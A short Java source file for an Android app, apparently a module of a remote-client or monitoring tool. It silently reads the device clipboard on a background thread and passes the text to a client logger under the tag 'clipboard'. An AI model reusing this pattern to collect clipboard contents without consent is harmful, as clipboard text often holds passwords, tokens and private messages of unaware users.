package com.my.myapp.core.device;

import android.content.Context;
import android.content.ClipboardManager;
import android.content.ClipData;
import com.my.myapp.core.client.Logger;
import org.json.JSONObject;

public class Clipboard {
    private final Context context;

    public Clipboard(Context ctx) { this.context = ctx; }

    public void sendClipboard() {
        new Thread(() -> {
            try {
                ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData.Item item = cm.getPrimaryClip() != null ? cm.getPrimaryClip().getItemAt(0) : null;
                if (item == null) return;

                JSONObject data = new JSONObject();
                data.put("type", "clipboard");
                data.put("text", item.getText().toString());
                Logger.sendLog("clipboard", data);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}